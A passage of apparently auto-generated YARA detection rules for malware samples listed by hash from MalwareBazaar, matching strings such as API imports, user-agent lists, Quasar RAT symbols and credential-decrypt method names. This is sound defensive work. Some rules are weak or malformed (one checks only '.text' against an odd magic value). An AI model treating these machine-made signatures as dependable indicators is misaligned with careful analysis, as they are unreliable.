        $s10 = "WinHttp"
        $s11 = "ReadTextFileContents"
        $s12 = "GetBetween"
        $s13 = "writeXML"
        $s14 = "WriteChecked"
        $s15 = "SetForegroundWindow"
        $s16 = "kernel32"
        $s17 = "OpenProcess"
        $s18 = "CloseHandle"
        $s19 = "user32"
        $s20 = "user32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 49KB and
        all of them
}

rule Windows_d5957803eb8a1c83dd84f7d08d431c9ad3a7e3c29814f8b46b805083f5b4899a
{
    meta:
        description = "Auto ML: d5957803eb8a1c83dd84f7d08d431c9ad3a7e3c29814f8b46b805083f5b4899a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1007KB and
        all of them
}

rule Windows_d5b9bffbdd9374148ce17cf077004e48c5493fdbb46eac2c80af1ed2c5d2a874
{
    meta:
        description = "Auto ML: d5b9bffbdd9374148ce17cf077004e48c5493fdbb46eac2c80af1ed2c5d2a874"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System"
        $s6 = "GetString"
        $s7 = "System.IO"
        $s8 = "ModuleHandle"
        $s9 = "System.Collections.Generic"
        $s10 = "System.Management"
        $s11 = "System.Reflection"
        $s12 = "CreateMemberRefsDelegates"
        $s13 = "CreateGetStringDelegate"
        $s14 = "System.Security.Cryptography"
        $s15 = "System.Security"
        $s16 = "System.Runtime.CompilerServices"
        $s17 = "AssemblyFileVersionAttribute"
        $s18 = "AttributeTargets"
        $s19 = "GetInstances"
        $s20 = "GetEnumerator"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 12399KB and
        all of them
}

rule Windows_d5c2b2a0efc0a5a0d177937623fa457100cddf5164d901e4a7a5ff7b570637a5
{
    meta:
        description = "Auto ML: d5c2b2a0efc0a5a0d177937623fa457100cddf5164d901e4a7a5ff7b570637a5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "FiLe"
        $s5 = "ReadOnlyCollection`1"
        $s6 = "kernel32"
        $s7 = "Microsoft.Win32"
        $s8 = "WriteInt32"
        $s9 = "<Module>"
        $s10 = "CreateDC"
        $s11 = "DeleteDC"
        $s12 = "get_ASCII"
        $s13 = "System.IO"
        $s14 = "CreateFileTransactedW"
        $s15 = "CreateFileW"
        $s16 = "GetFileAttributesW"
        $s17 = "GetFileAttributesExW"
        $s18 = "UploadData"
        $s19 = "set_Verb"
        $s20 = "GetHdc"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2460KB and
        all of them
}

rule Windows_1521915bc1bde69c80a1d12af9c9ecbf8dc7ae534256ee71b28cbb2571fc0db0
{
    meta:
        description = "Auto ML: 1521915bc1bde69c80a1d12af9c9ecbf8dc7ae534256ee71b28cbb2571fc0db0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "DeleteFileW"
        $s8 = "FindFirstFileW"
        $s9 = "FindNextFileW"
        $s10 = "FindClose"
        $s11 = "SetFilePointer"
        $s12 = "ReadFile"
        $s13 = "GetPrivateProfileStringW"
        $s14 = "WritePrivateProfileStringW"
        $s15 = "LoadLibraryExW"
        $s16 = "GetModuleHandleW"
        $s17 = "GetExitCodeProcess"
        $s18 = "CloseHandle"
        $s19 = "SetFileTime"
        $s20 = "CompareFileTime"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 750KB and
        all of them
}

rule Windows_d5d71b4ba13c6a8f154163c71f515dc26f64b61c6849af78e5aadc0356b86f89
{
    meta:
        description = "Auto ML: d5d71b4ba13c6a8f154163c71f515dc26f64b61c6849af78e5aadc0356b86f89"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "System.Xml.Schema"
        $s7 = "GetTypedTableSchema"
        $s8 = "ReadXmlSchema"
        $s9 = "WriteXmlSchema"
        $s10 = "GetTypedDataSetSchema"
        $s11 = "System.Data"
        $s12 = "GetSerializationData"
        $s13 = "GetData"
        $s14 = "System.Collections.Generic"
        $s15 = "Read"
        $s16 = "add_Load"
        $s17 = "HomeCarStore_Load"
        $s18 = "SetAdded"
        $s19 = "set_Enabled"
        $s20 = "set_FormattingEnabled"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 631KB and
        all of them
}

rule Windows_d5fae927a1a1b6e3d99a1f3df7102c77ae2be31680ea655d118323b02b04a47b
{
    meta:
        description = "Auto ML: d5fae927a1a1b6e3d99a1f3df7102c77ae2be31680ea655d118323b02b04a47b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1263KB and
        all of them
}

rule Windows_d6069cb7acd4675b324603f2adc3e83fa7fa1829e73052a8d62a10f3d99a8200
{
    meta:
        description = "Auto ML: d6069cb7acd4675b324603f2adc3e83fa7fa1829e73052a8d62a10f3d99a8200"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 639KB and
        all of them
}

rule Windows_d60bb69da27799d822608902c59373611c18920c77887de7489d289ebf2bd53e
{
    meta:
        description = "Auto ML: d60bb69da27799d822608902c59373611c18920c77887de7489d289ebf2bd53e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "!setybdeta}"
        $s6 = "* Written by Robert Simpson (robert@blackcastlesoft.com)"
        $s7 = "<DataType>System.Int16</DataType>"
        $s8 = "<CreateFormat>smallint</CreateFormat>"
        $s9 = "<DataType>System.Int32</DataType>"
        $s10 = "<CreateFormat>int</CreateFormat>"
        $s11 = "<CreateFormat>mediumint</CreateFormat>"
        $s12 = "<DataType>System.Double</DataType>"
        $s13 = "<CreateFormat>real</CreateFormat>"
        $s14 = "<DataType>System.Single</DataType>"
        $s15 = "<CreateFormat>single</CreateFormat>"
        $s16 = "<CreateFormat>float</CreateFormat>"
        $s17 = "<CreateFormat>double</CreateFormat>"
        $s18 = "<DataType>System.Decimal</DataType>"
        $s19 = "<CreateFormat>money</CreateFormat>"
        $s20 = "<CreateFormat>currency</CreateFormat>"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7271KB and
        all of them
}

rule Windows_d63a83fb534fd92df1de5373ce6fa7febf6ca715c7528a2a806de49da2889078
{
    meta:
        description = "Auto ML: d63a83fb534fd92df1de5373ce6fa7febf6ca715c7528a2a806de49da2889078"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 207KB and
        all of them
}

rule Windows_d63d27212f6e489dc2982042e25752db578b49c6c92e376951e84cdcb52ef5cd
{
    meta:
        description = "Auto ML: d63d27212f6e489dc2982042e25752db578b49c6c92e376951e84cdcb52ef5cd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Resources"
        $s13 = "AssemblyKeyFileAttribute"
        $s14 = "history_with_pictures_and_dates.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5257KB and
        all of them
}

rule Linux_d67301c3408cfed8b8a35b09a1cdd17fcc104358833b4d3a64277c07982f6b1f
{
    meta:
        description = "Auto ML: d67301c3408cfed8b8a35b09a1cdd17fcc104358833b4d3a64277c07982f6b1f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 156KB and
        all of them
}

rule Windows_d6b34e4d6ae059a7d26daa9d1aef34f505a0015560afaa87f6c47721ad020699
{
    meta:
        description = "Auto ML: d6b34e4d6ae059a7d26daa9d1aef34f505a0015560afaa87f6c47721ad020699"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Framework.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{65ED2246-F122-4AA7-804F-42BF5FE0EE40}"
        $s15 = "<Module>{86eadf15-c2f6-4f35-b266-86b07ca56d5e}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.IO"
        $s19 = "Module"
        $s20 = "System.Security.Cryptography"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 578KB and
        all of them
}

rule Windows_d6be3ce60c7585b89ff180e61027f1c0259975b5c4b3d315fc9a70ee46e5392e
{
    meta:
        description = "Auto ML: d6be3ce60c7585b89ff180e61027f1c0259975b5c4b3d315fc9a70ee46e5392e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1153KB and
        all of them
}

rule Windows_d6e58255fab8064f94b2ab44eebb1f1dcebae14efdb0fb28b6944e6f56e65571
{
    meta:
        description = "Auto ML: d6e58255fab8064f94b2ab44eebb1f1dcebae14efdb0fb28b6944e6f56e65571"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
    condition:
        uint32(0) == 0x00805a4d and
        filesize < 41KB and
        all of them
}

rule Windows_01be856a9d037fdab8d3ce0046daae65fecaa637af55bf6333518a6d9459d600
{
    meta:
        description = "Auto ML: 01be856a9d037fdab8d3ce0046daae65fecaa637af55bf6333518a6d9459d600"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5089KB and
        all of them
}

rule Windows_154b2ea6e95240a1abf95ad3f2ad6dd2c46d712f1c63f8a01ac4d16712d38a23
{
    meta:
        description = "Auto ML: 154b2ea6e95240a1abf95ad3f2ad6dd2c46d712f1c63f8a01ac4d16712d38a23"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "SystemsManagementFramework"
        $s17 = "ReadyState"
        $s18 = "Shdocvw.dll"
        $s19 = "OWC11.Spreadsheet"
        $s20 = "Spreadsheet"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_d71d01acd695f47a0cdea48e9dd7b3c2facbafa2f35f198eba6a58232fd59d8a
{
    meta:
        description = "Auto ML: d71d01acd695f47a0cdea48e9dd7b3c2facbafa2f35f198eba6a58232fd59d8a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.textbss"
        $s3 = ".rdata"
        $s4 = "@.data"
        $s5 = ".rsrc"
        $s6 = "@.reloc"
        $s7 = "Roland GS Sound Set/Microsoft (P) 1996 Roland Corporation"
        $s8 = "GetProcessHeap"
        $s9 = "GetModuleFileNameW"
        $s10 = "CloseHandle"
        $s11 = "CreateEventA"
        $s12 = "GetModuleHandleA"
        $s13 = "HeapCreate"
        $s14 = "KERNEL32.dll"
        $s15 = "GetDlgCtrlID"
        $s16 = "GetClassInfoW"
        $s17 = "GetClassInfoExW"
        $s18 = "GetScrollRange"
        $s19 = "SetMenuItemInfoW"
        $s20 = "CreateAcceleratorTableW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 449KB and
        all of them
}

rule Windows_d7567c94d64fc05b847558d0308b54df1a716fcbe45a480ade6f2987a5ebbaef
{
    meta:
        description = "Auto ML: d7567c94d64fc05b847558d0308b54df1a716fcbe45a480ade6f2987a5ebbaef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 301KB and
        all of them
}

rule Linux_d7745852e7fd0e557896f1c6653f60bbcc05f1fc5d2605931d52517d2be64772
{
    meta:
        description = "Auto ML: d7745852e7fd0e557896f1c6653f60bbcc05f1fc5d2605931d52517d2be64772"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "-da^1open"
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s3 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB and
        all of them
}

rule Windows_d77a59decea0b458372ccc3ace96fcf3726346ef030fb6dd35e0ba64ba734f0b
{
    meta:
        description = "Auto ML: d77a59decea0b458372ccc3ace96fcf3726346ef030fb6dd35e0ba64ba734f0b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "wInq"
        $s6 = "DSetg"
        $s7 = "|sEtX"
        $s8 = "<Module>"
        $s9 = "Writer"
        $s10 = "System"
        $s11 = "System.Collections.Generic"
        $s12 = "fileNames"
        $s13 = "fileTypes"
        $s14 = "fileRunTypes"
        $s15 = "fileDropPaths"
        $s16 = "GetResource"
        $s17 = "WriteAllBytes"
        $s18 = "GetModuleHandle"
        $s19 = "file"
        $s20 = "fileBytes"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6756KB and
        all of them
}

rule Windows_d7a8958c5fde707a0943fb7021e254fd142fb434f4d9b7fcd03f1857ddfeeea9
{
    meta:
        description = "Auto ML: d7a8958c5fde707a0943fb7021e254fd142fb434f4d9b7fcd03f1857ddfeeea9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Windows_d7b86eb0a40bd710bf24b8e66b36d8d65f50eee6a32e4818b5d52d1de13754ea
{
    meta:
        description = "Auto ML: d7b86eb0a40bd710bf24b8e66b36d8d65f50eee6a32e4818b5d52d1de13754ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "processorArchitecture=\"X86\""
        $s4 = "name=\"Enigma.exe\""
        $s5 = "type=\"win32\" />"
        $s6 = "type=\"win32\""
        $s7 = "name=\"Microsoft.Windows.Common-Controls\""
        $s8 = "processorArchitecture=\"X86\""
        $s9 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s10 = "http://pki-ocsp.symauth.com0"
        $s11 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s12 = "kernel32.dll"
        $s13 = "user32.dll"
        $s14 = "advapi32.dll"
        $s15 = "oleaut32.dll"
        $s16 = "shell32.dll"
        $s17 = "version.dll"
        $s18 = "CRYPT32.dll"
        $s19 = "SHLWAPI.dll"
        $s20 = "gdiplus.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1832KB and
        all of them
}

rule Windows_d828c33f3480155b1115184b721e44c7a42a8026752ffc28a593e3c2284ac716
{
    meta:
        description = "Auto ML: d828c33f3480155b1115184b721e44c7a42a8026752ffc28a593e3c2284ac716"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_ImagenURL"
        $s6 = "set_ImagenURL"
        $s7 = "get_ZCPW"
        $s8 = "get_Marca"
        $s9 = "set_Marca"
        $s10 = "get_Categoria"
        $s11 = "set_Categoria"
        $s12 = "System.Data"
        $s13 = "setearConsulta"
        $s14 = "System.Collections.Generic"
        $s15 = "Read"
        $s16 = "add_Load"
        $s17 = "frmConSettings_Load"
        $s18 = "set_AutoScaleMode"
        $s19 = "set_SizeMode"
        $s20 = "set_Image"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 617KB and
        all of them
}

rule Windows_d85b912c5171741966d6c8238db04de39b56ed1b696ccf7a32400d34cd29338c
{
    meta:
        description = "Auto ML: d85b912c5171741966d6c8238db04de39b56ed1b696ccf7a32400d34cd29338c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "0Control array already has a control at index |1."
        $s6 = "jThere are no controls in this control array.  Loading a new control requires an existing control to clone."
        $s7 = ",Can't unload controls created at design time"
        $s8 = "1Control array element |1 has already been loaded."
        $s9 = "File not found"
        $s10 = "File not found: \"|1\""
        $s11 = "`Bitmaps, Cursors and Icons are not supported in LoadResData.  Please use LoadResPicture instead."
        $s12 = ".Unable to determine screen resolution settings"
        $s13 = ":NextItem cannot be set to the currently executing WebItem."
        $s14 = "<WebClass New() Parameter 'UserWebClassName' is not optional."
        $s15 = "<WebClass New() Parameter 'WebClassFileName' is not optional."
        $s16 = "OA matching closing tag could not be found in the template. The missing Tag is :"
        $s17 = ";Unexpected error attempting to load HTML template resource."
        $s18 = "2Unexpected error attempting to load template file."
        $s19 = "$No HTML Template file was specified."
        $s20 = "2Unexpected error while reading from template file."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 493KB and
        all of them
}

rule Windows_d8ad33f5876e2e5b2bc41235a529cda895c46dc7df5c1eaf9aeb72dff4d249eb
{
    meta:
        description = "Auto ML: d8ad33f5876e2e5b2bc41235a529cda895c46dc7df5c1eaf9aeb72dff4d249eb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "already connected"
        $s7 = "bad file descriptor"
        $s8 = "connection aborted"
        $s9 = "connection already in progress"
        $s10 = "connection refused"
        $s11 = "connection reset"
